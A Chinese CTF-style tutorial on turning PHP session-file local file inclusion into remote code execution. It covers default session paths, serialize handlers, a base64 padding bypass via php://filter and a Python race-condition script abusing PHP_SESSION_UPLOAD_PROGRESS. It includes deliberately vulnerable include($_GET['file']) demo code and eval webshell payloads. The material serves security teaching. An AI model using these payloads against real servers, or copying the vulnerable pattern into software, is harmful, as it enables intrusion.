在前些时间，国赛上再一次遇到了服务器本地文件包含`session`的漏洞，这是个老生常谈的东西了，但还是常常可以碰到，而我们想利用`session`来`getshell`往往还需要一些特殊的方法，借此机会，研究一番。

本文涉及相关实验：[文件包含漏洞-中级篇](https://www.hetianlab.com/expc.do?ec=ECID21bb-8308-4117-ab95-a4602fa6c377&pk_campaign=freebuf-wemedia)（本实验介绍了文件包含时绕过限制的原理，以及介绍利用文件包含漏洞读取源码的原理。）

## 基础知识

### PHP SESSION的存储

#### SESSION会话存储方式

在`Java`中，用户的session是存储在内存中的，而在`PHP`中，则是将session以文件的形式存储在服务器某个文件中，我们可以在`php.ini`里面设置`session`的存储位置`session.save_path`

![headImg.action?news=5290970d-7f72-40e9-950a-dbdb9002e574.png](https://image.3001.net/images/20210609/1623225650_60c075324bdb1644cf7a3.png!small)

在很多时候服务器都是按照默认设置来运行的，假如我们发现了一个没有安全措施的`session`文件包含漏洞时，我们就可以尝试利用默认的会话存放路径去包含`getshell`，因此总结常见的`php-session`的默认存储位置是很有必要的

#### 默认路径

    
    
    /var/lib/php/sess_PHPSESSID  
    /var/lib/php/sessions/sess_PHPSESSID  
    /tmp/sess_PHPSESSID  
    /tmp/sessions/sess_PHPSESSID

> `session`文件的存储路径是分为两种情况的
>
>
> 一是没有权限，默认存储在`/var/lib/php/sessions/`目录下，文件名为`sess_[phpsessid]`，而`phpsessid`在发送的请求的`cookie`字段中可以看到（一般在利用漏洞时我们自己设置`phpsessid`）
>
>
> 二是`phpmyadmin`，这时的`session`文件存储在`/tmp`目录下，需要在`php.ini`里把`session.auto_start`置为1，把`session.save_path`目录设置为`/tmp`

### 与 SESSION 有关的几个 PHP 选项

![headImg.action?news=9120510e-c382-43b4-b3d4-9793c69864b0.png](https://image.3001.net/images/20210609/1623225652_60c075341acb46c57ff9b.png!small)

#### session.serialize_handler

>
> 一是`php`，服务器在配置文件或代码里面没有对session进行配置的话，PHP默认的会话处理方式就是`session.serialize_handler=php`这种模式机制，这种模式只对用户名的内容进行了序列化存储，没有对变量名进行序列化，我们可以看作是服务器对用户会话信息的半序列化存储
>
> 二是`session.serialize_handler=php_serialize`，这种处理模式在`PHP
> 5.5`后开始启用，与上一种类似，但无论是用户名的内容还是变量名等都进行了系列化，可以看作是服务器对用户会话信息的全序列化存储
>
> 三是`php_binary`，其存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值

常见就是以上三种，还有一些其他的比如`session.serialize_handler = wddx`等这里就不展开赘述了

对比上面`session.serialize_handler`的两种处理模式，可以看到他们在session处理上的差异，但我们编写代码不规范时对session的处理采用了多种情况，那么在攻击者可以利用的情况下，很可能会造成session反序列化漏洞。

#### session.auto_start

![headImg.action?news=2459a98f-92b5-499e-ab75-9c2470a2136d.png](https://image.3001.net/images/20210609/1623225652_60c07534aeeb7433adfa0.png!small)

默认是`off`状态，如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行`session_start()`。

#### session.use_strict_mode

![headImg.action?news=8298628f-8e17-4d65-a699-38b9a1654556.png](https://image.3001.net/images/20210609/1623225653_60c0753561792ebe55138.png!small)

默认是`0`，此时用户是可以自己定义`Session
ID`的。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：`/tmp/sess_flag`。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值.

因为`sessid`的可控，我们很容易借此达到我们`getshell`的目的，但是我们还存在`session.upload_progress.cleanup`

#### session.upload_progress.cleanup

![headImg.action?news=c3fdba06-afaa-4fdc-9bb5-a7f8f209555f.png](https://image.3001.net/images/20210609/1623225654_60c07536398f5e24d417a.png!small)

默认开启，一旦读取了所有POST数据，它就会清除进度信息，所以我们一般都要通过条件竞争来进行文件上传

#### session.upload_progress.enabled

默认情况下是开启的，但也当该配置开启时，我们今天要讲的重点才得以引出

### Session Upload Progress

`Session Upload Progress`即 Session
上传进度，是`php>=5.4`后开始添加的一个特性。官网对他的描述是当`session.upload_progress.enabled`选项开启时（默认开启），PHP
能够在每一个文件上传时 **监测上传进度**
。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个`POST`请求到终端（例如通过XHR）来检查这个状态。

当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时，上传进度可以在`$_SESSION`中获得。
当PHP检测到这种POST请求时，它会在`$_SESSION`中添加一组数据，索引是`session.upload_progress.prefix`与`session.upload_progress.name`连接在一起的值。

![headImg.action?news=6fd8487b-828d-4879-ae1d-40960dad2a9f.png](https://image.3001.net/images/20210609/1623225655_60c0753710fcb44a40a56.png!small)

下面给出一个php官方文档的一个进度数组的结构的样例：

    
    
    <form action="upload.php" method="POST" enctype="multipart/form-data">  
    <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />  
    <input type="file" name="file1" />  
    <input type="file" name="file2" />  
    <input type="submit" />  
    </form>

此时在session中存放的数据看上去是这样子的：

    
    
    <?php  
    $_SESSION["upload_progress_123"] = array(    // 其中存在上面表单里的value值"123"  
    "start_time" => 1234567890,   // The request time 请求时间  
    "content_length" => 57343257, // POST content length  post数据长度  
    "bytes_processed" => 453489,  // Amount of bytes received and processed  已接收的字节数量  
    "done" => false,              // true when the POST handler has finished, successfully or not  
    "files" => array(  
    0 => array(  
    "field_name" => "file1",       // Name of the <input/> field  上传区域  
    // The following 3 elements equals those in $_FILES  
    "name" => "foo.avi",     // 上传文件名  
    "tmp_name" => "/tmp/phpxxxxxx",     // 上传后在服务端的临时文件名  
    "error" => 0,  
    "done" => true,                // True when the POST handler has finished handling this file  
    "start_time" => 1234567890,    // When this file has started to be processed  
    "bytes_processed" => 57343250, // Amount of bytes received and processed for this file  
    ),  
    // An other file, not finished uploading, in the same request  
    1 => array(  
    "field_name" => "file2",  
    "name" => "bar.avi",  
    "tmp_name" => NULL,  
    "error" => 0,  
    "done" => false,  
    "start_time" => 1234567899,  
    "bytes_processed" => 54554,  
    ),  
    )  
    );

## LFI漏洞

LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如Session会话文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。

我们这里重点讲的是针对`LFI
Session`文件包含，我们可以简单理解成以为配置的原因，用户可以控制`session`文件中的部分信息，然后将这部分信息更改为恶意代码，然后去包含这个`session`文件达到攻击效果，在下面，我会演示一下大概流程

### 演示代码

session.php

    
    
    <?php  
    session_start();  
    $username = $_POST['username'];  
    $_SESSION["username"] = $username;  
    ?>

index.php

    
    
    <?php  
    $file  = $_GET['file'];  
    include($file);  
    ?>

payload

分析`session.php`可以看到用户会话信息`username`的值用户是可控的，因为服务器没有对该部分作出限制。那么我们就可以传入恶意代码就行攻击利用

我们传入

    
    
    username=Abc

![headImg.action?news=e94d7fdb-b20b-435e-82b8-e6641052f320.png](https://image.3001.net/images/20210609/1623225656_60c0753801a8ec710c7e3.png!small)

我们看到，系统给我们初始了一个`sess_ID`

![headImg.action?news=0f711254-4960-4051-8b31-57dacba8d50a.png](https://image.3001.net/images/20210609/1623225659_60c0753b027c9616c98cc.png!small)

可以看出我们可以对`username`进行控制，那么假如我们传入的是一句话木马呢

    
    
    username=<?php eval($_REQUEST['Abc']);?>

![headImg.action?news=e81d1855-d9af-4685-9047-55ba537f7a91.png](https://image.3001.net/images/20210609/1623225659_60c0753b8f7e3471e5787.png!small)

![headImg.action?news=64e9c1b2-4cea-461e-b8a3-1f4d04b90be9.png](https://image.3001.net/images/20210609/1623225660_60c0753c7931585b0d982.png!small)

一句话马传入了，我们试试是不是真的可以像我们想的那样执行

![headImg.action?news=f54dc242-d03f-4ad6-96de-48bb41ebfdeb.png](https://image.3001.net/images/20210609/1623225661_60c0753d1a358297caeea.png!small)

从攻击结果可以看到我们的payload和恶意代码确实都已经正常解析和执行。

当然这是一种理想化的简单的漏洞利用情况，但是在平常中会有很多限制，常见的就是两种：1.对用户的会话信息进行了一定的处理，例如对用户session信息进行编码或加密
2.没有代码`session_start()`进行会话的初始化操作，这时服务器无法生成用户session文件，同时，用户也无法进行恶意session文件包含

下面，我们来讲一讲怎么绕过这些限制

### Session Base64Encode

很多时候服务器上的session信息会由base64编码之后再进行存储，那么假如存在本地文件包含漏洞的时候该怎么去利用绕过呢？下面通过一个案例进行讲解与利用。

#### demo

##### session.php

    
    
    <?php  
    session_start();  
    $username = $_POST['username'];  
    $_SESSION['username'] = base64_encode($username);  
    echo "username -> $username";  
    ?>

##### index.php

    
    
    <?php  
    $file  = $_GET['file'];  
    include($file);  
    ?>

#### exp

按照我们的一般套路注入

![headImg.action?news=ce927be2-2dc8-4f25-8dfc-3069f8c6bcce.png](https://image.3001.net/images/20210609/1623225661_60c0753dc8ad9b22888df.png!small)

![headImg.action?news=e5cb28fb-1a8c-4537-9e13-736c1c62f787.png](https://image.3001.net/images/20210609/1623225662_60c0753e65a1f00fb3475.png!small)

我们可以发现我们包含的session被编码了，导致 **LFI - > session**失败。

在这里可以用逆向思维想一下，他既然对我们传入的session进行了base64编码，那么我们是不是只要对其进行base64解码然后再包含不就可以了，这个时候`php://filter`就可以利用上了。（其他编码同理）

    
    
    index.php?file=php://filter/read=convert.base64-decode/resource=/phpStudy/PHPTutorial/tmp/tmp/sess_gnl84oftbpj0l47o5m2hlooi92

![headImg.action?news=f9c4aaa9-301e-4db4-ac15-82cc3177f82e.png](https://image.3001.net/images/20210609/1623225663_60c0753f1fcf9316ec784.png!small)

吼，无法解码！

这是为什么，来来来我们再仔细看看session文件内容

![headImg.action?news=66a702e4-5720-4ed6-a50f-946d22e49ff8.png](https://image.3001.net/images/20210609/1623225663_60c0753fa7514037ccf4c.png!small)

    
    
    username|s:44:"PD9waHAgZXZhbCgkX1JFUVVFU1RbJ0FiYyddKTs/Pg==";

看到了吗，这里并不是只有base64密文，还有`username|s:44:"`这一段 **非base64** 的字符串，编码与解码不对应，当然无法解码

那么我们有什么方法解决吗

首先我们先来了解一下base64编码的特点

> Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。
>
>
> Base64将输入字符串按字节切分，取得每个字节对应的二进制值（若不足8比特则高位补0），然后将这些二进制数值串联起来，再按照6比特一组进行切分（因为2^6=64），最后一组若不足6比特则末尾补0。将每组二进制值转换成十进制，然后在上述表格中找到对应的符号并串联起来就是Base64编码结果。
>
>
> 由于二进制数据是按照8比特一组进行传输，因此Base64按照6比特一组切分的二进制数据必须是24比特的倍数（6和8的最小公倍数）。24比特就是3个字节，若原字节序列数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。
>
>
> 一个字符串中，不管出现多少个特殊字符或者位置上的差异，都不会影响最终的结果，可以验证base64_decode是遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

总而言之，要想正常解码，需要 **session前面的这部分数据长度需要满足4的整数倍** ，据此我们再次构造payload

    
    
    username=abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd<?php eval($_POST['Abc']);?>

![headImg.action?news=af8404aa-9645-4e34-8583-4743df7bd325.png](https://image.3001.net/images/20210609/1623225664_60c075404ef2d6bcf0455.png!small)

![headImg.action?news=07735e5d-4974-4a52-b980-0cc0a48b326a.png](https://image.3001.net/images/20210609/1623225665_60c0754114533a74e0f95.png!small)

符合，我们重新传参看看

![headImg.action?news=9f92e3bd-f85a-4b2f-852f-0c9c4c3548dc.png](https://image.3001.net/images/20210609/1623225665_60c07541b8c6ff31f7bc7.png!small)

![headImg.action?news=fa0c6d5a-ab7c-4b88-bb0b-5bf05e55dcbd.png](https://image.3001.net/images/20210609/1623225666_60c0754289fcffd9c452f.png!small)

执行成功

注：这是在`session.serialize_handler=php`配置下执行成功的，在其他配置下也是同样的原理

### No session_start()

一般情况下，`session_start()`作为会话的开始出现在用户登录等地方以维持会话，但是如果一个网站存在LFI漏洞但却没有用户会话，那么我们该怎么去包含session信息呢

还记得我们上面说过的`Session Upload Progress`吗？

> Session Upload Progress
> 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化Session。——[WHOAMIBunny](https://xz.aliyun.com/u/31688)

session中一部分数据(`session.upload_progress.name`)是用户自己可以控制的，那么我们在Cookie中设置`PHPSESSID=Abc`（默认情况下由于`session.use_strict_mode=0`用户可以自定义`Session
ID`），同时POST恶意字段`PHP_SESSION_UPLOAD_PROGRESS`，只要上传包里带上这个键，PHP就会自动启用Session，又由于我们之前设置了`Session
ID`，所以session文件会自动创建且可控

但又由于`session.upload_progress.cleanup =
on`这个配置的存在，当文件上传结束后，php将会立即清空对应session文件中的内容，这会导致我们最终包含的只是一个空文件，所以我们要利用条件竞争，在session文件被清除之前利用

    
    
    import io  
    import requests  
    import threading  
    sessid = 'SsBNMsssSssssL'  
    data = {"cmd":"system('cat flag.php');"}  
    def write(session):  
    while True:  
    f = io.BytesIO(b'a' * 1024 * 50)  
    resp = session.post('http://192.168.43.82', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php var_dump(scandir("/etc"));?>'}, files={'file': ('a.txt',f)}, cookies={'PHPSESSID': sessid} )  
    def read(session):  
    while True:  
    data={  
    'filed':'',  
    'cf':'../../../../../../var/lib/php/sessions/eadhacfafh/sess_'+sessid  
    }  
    resp = session.post('http://192.168.43.82/index.php',data=data)  
    if 'a.txt' in resp.text:  
    print(resp.text)  
    event.clear()  
    else:  
    print("[+++++++++++++]retry")  
    if __name__=="__main__":  
    event=threading.Event()  
    with requests.session() as session:  
    for i in range(1,30):   
    threading.Thread(target=write,args=(session,)).start()  
    for i in range(1,30):  
    threading.Thread(target=read,args=(session,)).start()  
    event.set()

国赛的脚本，改下payload即可

